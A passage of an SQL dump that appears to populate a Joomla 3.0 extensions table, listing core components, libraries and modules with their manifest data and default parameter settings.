'{"show_contact_category":"hide","show_contact_list":"0","presentation_style":"sliders","show_name":"1","show_position":"1","show_email":"0","show_street_address":"1","show_suburb":"1","show_state":"1","show_postcode":"1","show_country":"1","show_telephone":"1","show_mobile":"1","show_fax":"1","show_webpage":"1","show_misc":"1","show_image":"1","image":"","allow_vcard":"0","show_articles":"0","show_profile":"0","show_links":"0","linka_name":"","linkb_name":"","linkc_name":"","linkd_name":"","linke_name":"","contact_icons":"0","icon_address":"","icon_email":"","icon_telephone":"","icon_mobile":"","icon_fax":"","icon_misc":"","show_headings":"1","show_position_headings":"1","show_email_headings":"0","show_telephone_headings":"1","show_mobile_headings":"0","show_fax_headings":"0","allow_vcard_headings":"0","show_suburb_headings":"1","show_state_headings":"1","show_country_headings":"1","show_email_form":"1","show_email_copy":"1","banned_email":"","banned_subject":"","banned_text":"","validate_session":"1","custom_reply":"0","redirect":"","show_category_crumb":"0","metakey":"","metadesc":"","robots":"","author":"","rights":"","xreference":""}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(9, 'com_cpanel', 'component', 'com_cpanel', '', 1, 1, 1, 1, '{"name":"com_cpanel","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_CPANEL_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10, 'com_installer', 'component', 'com_installer', '', 1, 1, 1, 1, '{"name":"com_installer","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_INSTALLER_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(11, 'com_languages', 'component', 'com_languages', '', 1, 1, 1, 1, '{"name":"com_languages","type":"component","creationDate":"2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\n\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_LANGUAGES_XML_DESCRIPTION","group":""}', '{"administrator":"en-GB","site":"en-GB"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(12, 'com_login', 'component', 'com_login', '', 1, 1, 1, 1, '{"name":"com_login","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_LOGIN_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(13, 'com_media', 'component', 'com_media', '', 1, 1, 0, 1, '{"name":"com_media","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_MEDIA_XML_DESCRIPTION","group":""}', '{"upload_extensions":"bmp,csv,doc,gif,ico,jpg,jpeg,odg,odp,ods,odt,pdf,png,ppt,swf,txt,xcf,xls,BMP,CSV,DOC,GIF,ICO,JPG,JPEG,ODG,ODP,ODS,ODT,PDF,PNG,PPT,SWF,TXT,XCF,XLS","upload_maxsize":"10","file_path":"images","image_path":"images","restrict_uploads":"1","allowed_media_usergroup":"3","check_mime":"1","image_extensions":"bmp,gif,jpg,png","ignore_extensions":"","upload_mime":"image\\/jpeg,image\\/gif,image\\/png,image\\/bmp,application\\/x-shockwave-flash,application\\/msword,application\\/excel,application\\/pdf,application\\/powerpoint,text\\/plain,application\\/x-zip","upload_mime_illegal":"text\\/html","enable_flash":"0"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(14, 'com_menus', 'component', 'com_menus', '', 1, 1, 1, 1, '{"name":"com_menus","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_MENUS_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(15, 'com_messages', 'component', 'com_messages', '', 1, 1, 1, 1, '{"name":"com_messages","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_MESSAGES_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(16, 'com_modules', 'component', 'com_modules', '', 1, 1, 1, 1, '{"name":"com_modules","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_MODULES_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(17, 'com_newsfeeds', 'component', 'com_newsfeeds', '', 1, 1, 1, 0, '{"name":"com_newsfeeds","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_NEWSFEEDS_XML_DESCRIPTION","group":""}', '{"show_feed_image":"1","show_feed_description":"1","show_item_description":"1","feed_word_count":"0","show_headings":"1","show_name":"1","show_articles":"0","show_link":"1","show_description":"1","show_description_image":"1","display_num":"","show_pagination_limit":"1","show_pagination":"1","show_pagination_results":"1","show_cat_items":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(18, 'com_plugins', 'component', 'com_plugins', '', 1, 1, 1, 1, '{"name":"com_plugins","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_PLUGINS_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(19, 'com_search', 'component', 'com_search', '', 1, 1, 1, 0, '{"name":"com_search","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\n\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_SEARCH_XML_DESCRIPTION","group":""}', '{"enabled":"0","show_date":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(20, 'com_templates', 'component', 'com_templates', '', 1, 1, 1, 1, '{"name":"com_templates","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_TEMPLATES_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(21, 'com_weblinks', 'component', 'com_weblinks', '', 1, 1, 1, 0, '{"name":"com_weblinks","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\n\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_WEBLINKS_XML_DESCRIPTION","group":""}', '{"show_comp_description":"1","comp_description":"","show_link_hits":"1","show_link_description":"1","show_other_cats":"0","show_headings":"0","show_numbers":"0","show_report":"1","count_clicks":"1","target":"0","link_icons":""}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(22, 'com_content', 'component', 'com_content', '', 1, 1, 0, 1, '{"name":"com_content","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_CONTENT_XML_DESCRIPTION","group":""}', '{"article_layout":"_:default","show_title":"1","link_titles":"0","show_intro":"0","info_block_position":"0","show_category":"0","link_category":"0","show_parent_category":"0","link_parent_category":"0","show_author":"0","link_author":"0","show_create_date":"0","show_modify_date":"0","show_publish_date":"0","show_item_navigation":"0","show_vote":"0","show_readmore":"0","show_readmore_title":"0","readmore_limit":"100","show_icons":"0","show_print_icon":"0","show_email_icon":"0","show_hits":"0","show_noauth":"0","urls_position":"0","show_publishing_options":"1","show_article_options":"1","show_urls_images_frontend":"0","show_urls_images_backend":"1","targeta":0,"targetb":0,"targetc":0,"float_intro":"left","float_fulltext":"left","category_layout":"_:blog","show_category_title":"0","show_description":"0","show_description_image":"0","maxLevel":"1","show_empty_categories":"0","show_no_articles":"1","show_subcat_desc":"1","show_cat_num_articles":"0","show_base_description":"1","maxLevelcat":"-1","show_empty_categories_cat":"0","show_subcat_desc_cat":"1","show_cat_num_articles_cat":"1","num_leading_articles":"1","num_intro_articles":"4","num_columns":"2","num_links":"4","multi_column_order":"0","show_subcategory_content":"0","show_pagination_limit":"1","filter_field":"hide","show_headings":"1","list_show_date":"0","date_format":"","list_show_hits":"1","list_show_author":"1","orderby_pri":"order","orderby_sec":"rdate","order_date":"published","show_pagination":"2","show_pagination_results":"1","show_feed_link":"1","feed_summary":"0","feed_show_readmore":"0"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(23, 'com_config', 'component', 'com_config', '', 1, 1, 0, 1, '{"name":"com_config","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_CONFIG_XML_DESCRIPTION","group":""}', '{"filters":{"1":{"filter_type":"NH","filter_tags":"","filter_attributes":""},"9":{"filter_type":"BL","filter_tags":"","filter_attributes":""},"6":{"filter_type":"BL","filter_tags":"","filter_attributes":""},"7":{"filter_type":"NONE","filter_tags":"","filter_attributes":""},"2":{"filter_type":"NH","filter_tags":"","filter_attributes":""},"3":{"filter_type":"BL","filter_tags":"","filter_attributes":""},"4":{"filter_type":"BL","filter_tags":"","filter_attributes":""},"5":{"filter_type":"BL","filter_tags":"","filter_attributes":""},"8":{"filter_type":"NONE","filter_tags":"","filter_attributes":""}}}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(24, 'com_redirect', 'component', 'com_redirect', '', 1, 1, 0, 1, '{"name":"com_redirect","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_REDIRECT_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(25, 'com_users', 'component', 'com_users', '', 1, 1, 0, 1, '{"name":"com_users","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_USERS_XML_DESCRIPTION","group":""}', '{"allowUserRegistration":"1","new_usertype":"2","guest_usergroup":"9","sendpassword":"1","useractivation":"1","mail_to_admin":"0","captcha":"","frontend_userparams":"1","site_language":"0","change_login_name":"0","reset_count":"10","reset_time":"1","mailSubjectPrefix":"","mailBodySuffix":""}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(27, 'com_finder', 'component', 'com_finder', '', 1, 1, 0, 0, '{"name":"com_finder","type":"component","creationDate":"August 2011","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_FINDER_XML_DESCRIPTION","group":""}', '{"show_description":"1","description_length":255,"allow_empty_query":"0","show_url":"1","show_advanced":"1","expand_advanced":"0","show_date_filters":"0","highlight_terms":"1","opensearch_name":"","opensearch_description":"","batch_size":"50","memory_table_limit":30000,"title_multiplier":"1.7","text_multiplier":"0.7","meta_multiplier":"1.2","path_multiplier":"2.0","misc_multiplier":"0.3","stemmer":"snowball"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(28, 'com_joomlaupdate', 'component', 'com_joomlaupdate', '', 1, 1, 0, 1, '{"name":"com_joomlaupdate","type":"component","creationDate":"February 2012","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_JOOMLAUPDATE_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(29, 'com_tags', 'component', 'com_tags', '', 1, 1, 1, 1, '{"legacy":false,"name":"com_tags","type":"component","creationDate":"March 2013","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"COM_TAGS_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(100, 'PHPMailer', 'library', 'phpmailer', '', 0, 1, 1, 1, '{"name":"PHPMailer","type":"library","creationDate":"2001","author":"PHPMailer","copyright":"(c) 2001-2003, Brent R. Matzelle, (c) 2004-2009, Andy Prevost. All Rights Reserved., (c) 2010-2012, Jim Jagielski. All Rights Reserved.","authorEmail":"jimjag@gmail.com","authorUrl":"https:\\/\\/code.google.com\\/a\\/apache-extras.org\\/p\\/phpmailer\\/","version":"5.2.1","description":"LIB_PHPMAILER_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(101, 'SimplePie', 'library', 'simplepie', '', 0, 1, 1, 1, '{"name":"SimplePie","type":"library","creationDate":"2004","author":"SimplePie","copyright":"Copyright (c) 2004-2009, Ryan Parman and Geoffrey Sneddon","authorEmail":"","authorUrl":"http:\\/\\/simplepie.org\\/","version":"1.2","description":"LIB_SIMPLEPIE_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(102, 'phputf8', 'library', 'phputf8', '', 0, 1, 1, 1, '{"name":"phputf8","type":"library","creationDate":"2006","author":"Harry Fuecks","copyright":"Copyright various authors","authorEmail":"hfuecks@gmail.com","authorUrl":"http:\\/\\/sourceforge.net\\/projects\\/phputf8","version":"0.5","description":"LIB_PHPUTF8_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(103, 'Joomla! Platform', 'library', 'joomla', '', 0, 1, 1, 1, '{"name":"Joomla! Platform","type":"library","creationDate":"2008","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"http:\\/\\/www.joomla.org","version":"12.2","description":"LIB_JOOMLA_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(200, 'mod_articles_archive', 'module', 'mod_articles_archive', '', 0, 1, 1, 0, '{"name":"mod_articles_archive","type":"module","creationDate":"July 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters.\\n\\t\\tAll rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_ARTICLES_ARCHIVE_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(201, 'mod_articles_latest', 'module', 'mod_articles_latest', '', 0, 1, 1, 0, '{"name":"mod_articles_latest","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_LATEST_NEWS_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(202, 'mod_articles_popular', 'module', 'mod_articles_popular', '', 0, 1, 1, 0, '{"name":"mod_articles_popular","type":"module","creationDate":"July 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_POPULAR_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(203, 'mod_banners', 'module', 'mod_banners', '', 0, 1, 1, 0, '{"name":"mod_banners","type":"module","creationDate":"July 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_BANNERS_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(204, 'mod_breadcrumbs', 'module', 'mod_breadcrumbs', '', 0, 1, 1, 1, '{"name":"mod_breadcrumbs","type":"module","creationDate":"July 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_BREADCRUMBS_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(205, 'mod_custom', 'module', 'mod_custom', '', 0, 1, 1, 1, '{"name":"mod_custom","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_CUSTOM_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(206, 'mod_feed', 'module', 'mod_feed', '', 0, 1, 1, 0, '{"name":"mod_feed","type":"module","creationDate":"July 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_FEED_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(207, 'mod_footer', 'module', 'mod_footer', '', 0, 1, 1, 0, '{"name":"mod_footer","type":"module","creationDate":"July 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_FOOTER_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(208, 'mod_login', 'module', 'mod_login', '', 0, 1, 1, 1, '{"name":"mod_login","type":"module","creationDate":"July 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_LOGIN_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(209, 'mod_menu', 'module', 'mod_menu', '', 0, 1, 1, 1, '{"name":"mod_menu","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_MENU_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(210, 'mod_articles_news', 'module', 'mod_articles_news', '', 0, 1, 1, 0, '{"name":"mod_articles_news","type":"module","creationDate":"July 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_ARTICLES_NEWS_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(211, 'mod_random_image', 'module', 'mod_random_image', '', 0, 1, 1, 0, '{"name":"mod_random_image","type":"module","creationDate":"July 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_RANDOM_IMAGE_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(212, 'mod_related_items', 'module', 'mod_related_items', '', 0, 1, 1, 0, '{"name":"mod_related_items","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_RELATED_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(213, 'mod_search', 'module', 'mod_search', '', 0, 1, 1, 0, '{"name":"mod_search","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_SEARCH_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(214, 'mod_stats', 'module', 'mod_stats', '', 0, 1, 1, 0, '{"name":"mod_stats","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_STATS_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(215, 'mod_syndicate', 'module', 'mod_syndicate', '', 0, 1, 1, 1, '{"name":"mod_syndicate","type":"module","creationDate":"May 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_SYNDICATE_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(216, 'mod_users_latest', 'module', 'mod_users_latest', '', 0, 1, 1, 0, '{"name":"mod_users_latest","type":"module","creationDate":"December 2009","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_USERS_LATEST_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(217, 'mod_weblinks', 'module', 'mod_weblinks', '', 0, 1, 1, 0, '{"name":"mod_weblinks","type":"module","creationDate":"July 2009","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_WEBLINKS_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(218, 'mod_whosonline', 'module', 'mod_whosonline', '', 0, 1, 1, 0, '{"name":"mod_whosonline","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_WHOSONLINE_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(219, 'mod_wrapper', 'module', 'mod_wrapper', '', 0, 1, 1, 0, '{"name":"mod_wrapper","type":"module","creationDate":"October 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_WRAPPER_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(220, 'mod_articles_category', 'module', 'mod_articles_category', '', 0, 1, 1, 0, '{"name":"mod_articles_category","type":"module","creationDate":"February 2010","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_ARTICLES_CATEGORY_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(221, 'mod_articles_categories', 'module', 'mod_articles_categories', '', 0, 1, 1, 0, '{"name":"mod_articles_categories","type":"module","creationDate":"February 2010","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_ARTICLES_CATEGORIES_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(222, 'mod_languages', 'module', 'mod_languages', '', 0, 1, 1, 1, '{"name":"mod_languages","type":"module","creationDate":"February 2010","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_LANGUAGES_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(223, 'mod_finder', 'module', 'mod_finder', '', 0, 1, 0, 0, '{"name":"mod_finder","type":"module","creationDate":"August 2011","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_FINDER_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(300, 'mod_custom', 'module', 'mod_custom', '', 1, 1, 1, 1, '{"name":"mod_custom","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_CUSTOM_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(301, 'mod_feed', 'module', 'mod_feed', '', 1, 1, 1, 0, '{"name":"mod_feed","type":"module","creationDate":"July 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_FEED_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(302, 'mod_latest', 'module', 'mod_latest', '', 1, 1, 1, 0, '{"name":"mod_latest","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_LATEST_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(303, 'mod_logged', 'module', 'mod_logged', '', 1, 1, 1, 0, '{"name":"mod_logged","type":"module","creationDate":"January 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_LOGGED_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(304, 'mod_login', 'module', 'mod_login', '', 1, 1, 1, 1, '{"name":"mod_login","type":"module","creationDate":"March 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_LOGIN_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(305, 'mod_menu', 'module', 'mod_menu', '', 1, 1, 1, 0, '{"name":"mod_menu","type":"module","creationDate":"March 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_MENU_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(307, 'mod_popular', 'module', 'mod_popular', '', 1, 1, 1, 0, '{"name":"mod_popular","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_POPULAR_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(308, 'mod_quickicon', 'module', 'mod_quickicon', '', 1, 1, 1, 1, '{"name":"mod_quickicon","type":"module","creationDate":"Nov 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_QUICKICON_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(309, 'mod_status', 'module', 'mod_status', '', 1, 1, 1, 0, '{"name":"mod_status","type":"module","creationDate":"Feb 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_STATUS_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(310, 'mod_submenu', 'module', 'mod_submenu', '', 1, 1, 1, 0, '{"name":"mod_submenu","type":"module","creationDate":"Feb 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_SUBMENU_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
